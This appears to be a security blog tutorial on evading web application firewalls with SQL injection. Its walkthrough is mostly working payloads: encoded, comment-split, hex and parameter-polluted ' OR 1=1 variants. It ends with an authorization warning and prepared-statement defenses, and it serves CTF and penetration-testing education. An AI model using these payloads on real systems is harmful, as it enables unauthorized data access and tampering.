---
title: "SQL Injection WAF Bypass Techniques: From Basics to Advanced Payloads"
description: "A practical guide to evading WAF filters with encoding, case variation, comments, and query parameter manipulation for CTFs and penetration testing."
pubDate: 2026-08-13
tags:
  - "SQL Injection"
  - "WAF Bypass"
  - "Web Security"
  - "Penetration Testing"
  - "CTF"
---

## Introduction

Web Application Firewalls (WAFs) are one of the most common defenses against SQL injection (SQLi). They sit between the client and the application, inspecting requests and blocking anything that looks malicious. However, WAFs are not a silver bullet. They work by pattern matching and normalization, and attackers can craft payloads that bypass these filters. This article walks through practical SQLi WAF bypass techniques, from simple tricks to more advanced approaches. It is intended for CTF players and penetration testers who already understand SQL injection but want to see how to evade common WAF rules.

## Core Concepts

Before diving into bypasses, it is important to understand how WAFs detect SQLi.

### How SQL Injection Works

SQL injection occurs when user input is concatenated into a SQL query without proper sanitization. The exact payload depends on whether the input is placed in an unquoted numeric context or inside a quoted string.

Unquoted numeric example:

```php
$query = "SELECT * FROM products WHERE id = " . $_GET['id'];
```

If an attacker submits `id=1 OR 1=1`, the query becomes:

```sql
SELECT * FROM products WHERE id = 1 OR 1=1
```

Because `1=1` is true for every row, the query returns all products.

Quoted string example:

```php
$query = "SELECT * FROM products WHERE id = '" . $_GET['id'] . "'";
```

If an attacker submits `id=1' OR 1=1-- `, the query becomes:

```sql
SELECT * FROM products WHERE id = '1' OR 1=1-- '
```

The `-- ` comments out the trailing quote, so the `OR 1=1` condition is active and all rows are returned.

Note: The exact syntax for comments varies by database; MySQL requires a space after `--`, while some other databases do not.

### What Does a WAF Do?

A WAF inspects HTTP requests and compares them against a set of rules. Rules often include regular expressions for known attack patterns such as `' OR 1=1--`, `UNION SELECT`, or `SLEEP(`. The WAF may also normalize the input by decoding URL-encoded characters, removing comments, or converting to lowercase before comparison.

Common WAF detection mechanisms include:

- **Signature matching**: Exact strings or regexes that match known malicious fragments.
- **Normalization**: Decoding URL and unicode encodings, removing whitespace or comments, and then applying signatures.
- **Anomaly detection**: Heuristics that flag requests containing suspicious characters in abnormal contexts.
- **Behavioral analysis**: Aggregated request patterns over time.

### Why Bypass Is Possible

Bypass techniques exploit differences between what the WAF normalizes and what the application or database interprets. For example, the WAF may decode `%27` to `'` once, but the application may decode it twice. Or the WAF may not handle MySQL-specific syntax such as `/*!50000UNION*/`. Bypassing is about finding a representation of the payload that the WAF does not recognize but the database still executes.

## Practical Walkthrough

For the examples below, assume a target application has a string parameter `id` that is vulnerable to SQLi:

```php
$query = "SELECT * FROM products WHERE id = '" . $_GET['id'] . "'";
```

The application is behind a simple WAF that blocks requests containing `' OR 1=1-- ` when the keyword appears in plain text.

### 1. Case Variation

The simplest bypass is to change the case of keywords, because some WAF rules are case-sensitive while databases are not.

Blocked payload:

```sql
1' OR 1=1-- 
```

Bypass with mixed case:

```sql
1' Or 1=1-- 
```

Many WAFs use case-insensitive matching, so this alone may not work, but it is worth testing because it costs nothing.

### 2. URL Encoding

WAFs and web servers decode URL-encoded characters. However, the order and number of decoding passes can differ.

Basic URL encoding of the payload:

```
1%27%20OR%201=1-- 
```

The `%27` is a single quote, and `%20` is a space. If the WAF only decodes once and compares the decoded string, this is still blocked. But some WAFs compare the raw encoded string, and the application decodes it later.

Double URL encoding:

```
1%2527%2520OR%25201=1-- 
```

Now the string contains `%27` after the first decode, and the application may decode it again to `'`. If the WAF does not recursively decode, the payload bypasses it.

Unicode encoding can also work in legacy environments. For example, `%u0027` represents a single quote in some WAF normalization schemes, but this is **not** a standard URL-encoding feature. It is mainly a legacy IIS/ASP.NET quirk; on modern stacks it may not be decoded at all. Test it only when the target stack is known to use such decoding.

### 3. Comments and Whitespace

SQL supports comments and unconventional whitespace. Inline comments can break up signature patterns.

Blocked:

```sql
1' OR 1=1-- 
```

Bypass with inline comments:

```sql
1'/**/OR/**/1=1-- 
```

The `/**/` is interpreted as a space by MySQL and many other databases. The WAF regex looking for `' OR` will not match because there is no space between the quote and `OR`.

MySQL version comments are even more interesting:

```sql
1'/*!50000OR*/1=1-- 
```

The `/*!50000OR*/` syntax causes MySQL to execute the keyword `OR` only if the server version is 5.00.00 or newer. Most modern MySQL servers are newer, so this works. The WAF may see it as a comment and ignore it.

Newlines and tabs can also break simple regexes:

```sql
1'%0AOR%0A1=1-- 
```

`%0A` is a newline. SQL treats whitespace and newlines as separators.

### 4. Keyword Obfuscation

Sometimes you can replace a blocked keyword with an equivalent expression.

- Use `||` instead of `OR` in MySQL (or any database where `||` is a logical OR):

  ```sql
  1' || 1=1-- 
  ```

- Use `&&` instead of `AND` in MySQL:

  ```sql
  1' && 1=1-- 
  ```

- Use hex-encoded literals to avoid spelling out a keyword. In MySQL, `0x4F52` is the hexadecimal value of the ASCII string `OR`. A payload such as `1' || 0x4F52=0x4F52-- ` evaluates to true without containing the exact `OR` keyword:

  ```sql
  1' || 0x4F52=0x4F52-- 
  ```

  This works because the database compares the two hex values and finds them equal, then uses `||` as a logical OR.

A note on `CONCAT()`: building a string with `CONCAT()` does **not** replace a SQL operator. It only produces a string value in the result set. Use it to construct data you want to see in the output, not to hide the `OR` or `AND` keyword in the WHERE clause.

### 5. Query Parameter Manipulation

WAFs often inspect only certain parameters. You can try placing the payload in a parameter the WAF ignores.

- **HTTP Parameter Pollution (HPP)**: Send two parameters with the same name. The WAF may check the first one, while the application uses the last one (or vice versa). For example:

  ```
  id=1&id=1' OR 1=1-- 
  ```

  If the application uses the second `id` but the WAF only inspects the first, the payload slips through.

- **JSON request bodies**: Many WAFs parse form data but not deeply nested JSON. Send the payload in a JSON field instead:

  ```json
  {"id": "1' OR 1=1--"}
  ```

- **Multipart/form-data**: Some WAFs do not decode multipart bodies correctly.

- **Changing the HTTP method**: A WAF may have different rules for GET and POST. Try the same request as POST if the application accepts both.

### 6. Advanced: Recursive URL Decoding

This is a more targeted bypass. Some WAFs only decode URL-encoded data once. The application, however, may call a decoding function multiple times. For example, if the application uses a framework that decodes the query string once, and then the database driver decodes it again, a double-encoded value can bypass the WAF.

Blocked:

```
id=1' OR 1=1-- 
```

Double-encoded:

```
id=1%2527%2520OR%25201=1-- 
```

The WAF may decode `%25` to `%` and stop, leaving `1%27%20OR%201=1--`, which does not match the rule. If the application performs another decoding pass, `%27` and `%20` become `'` and a space, and the payload reaches the query.

There is no one-size-fits-all recipe. Each WAF behaves differently, and bypasses depend on the exact configuration and the underlying database.

### Combining Techniques

In practice, you rarely use just one technique. For example, you might combine inline comments with case variation and hex encoding:

```sql
1'/**/Or/**/0x4F52=0x4F52-- 
```

This makes the payload significantly harder to match with a simple regex.

### Database-Specific Syntax

WAF bypass behavior depends heavily on the database. The table below highlights syntax differences that are often relevant when crafting payloads.

| Feature | MySQL / MariaDB | PostgreSQL | SQL Server |
| --- | --- | --- | --- |
| `#` comment | Yes | No | No |
| `--` comment | Yes, requires a space/control character after `--` | Yes | Yes |
| `/*!...*/` executable comment | Yes | No | No |
| `||` as logical OR | Yes by default (unless `PIPES_AS_CONCAT` is enabled) | No (string concatenation) | No |
| `&&` as logical AND | Yes | No | No |

These differences mean that a payload that works against MySQL may not work against PostgreSQL or SQL Server. Always identify the database version before investing time in a bypass.

## Security Implications

These bypass techniques show that a WAF cannot be the only line of defense. An attacker who understands the underlying technology can often find a way around the filter. The impact of a successful SQLi attack can be severe:

- Bypassing authentication
- Reading sensitive data
- Modifying or deleting data
- Executing operating system commands (in some configurations)

From a defender's perspective, the challenge is that bypasses are constantly evolving. A WAF rule that blocks a known payload may not block an obfuscated version, and the attacker only needs to find one working variant.

Always test these techniques only against systems you own or have explicit authorization to assess. CTF challenges and intentionally vulnerable labs are appropriate environments; production systems are not.

## Defensive Considerations

The most important lesson is to fix the root cause: never concatenate user input into SQL queries. Use prepared statements, parameterized queries, or an ORM with proper binding. This eliminates the SQLi vulnerability entirely, regardless of WAF rules.

If a WAF is used, tune it carefully:

- Normalize input consistently: decode URL encoding, strip comments, and lowercase keywords before matching.
- Follow the same decoding logic as the backend application, or use multiple normalization passes.
- Use context-aware detection rather than simple signatures. For example, flag a single quote when it appears in a numeric context.
- Do not trust the WAF to protect a vulnerable application. Regularly test for bypasses using automated tools and manual pentesting.

Also implement additional controls:

- Least privilege database accounts
- Input validation (e.g., allowlist for numeric IDs)
- Output encoding for any reflected data
- Monitoring and alerting on unusual query patterns

## Conclusion

WAF bypassing is a practical skill for anyone involved in web security testing. The techniques range from simple case changes to complex encoding and parameter manipulation. However, they all rely on a fundamental mismatch between what the WAF sees and what the application actually executes. The best defense is to write secure code that does not allow SQL injection in the first place. For security testers, understanding these evasions helps you evaluate the effectiveness of WAFs and harden applications before attackers do.
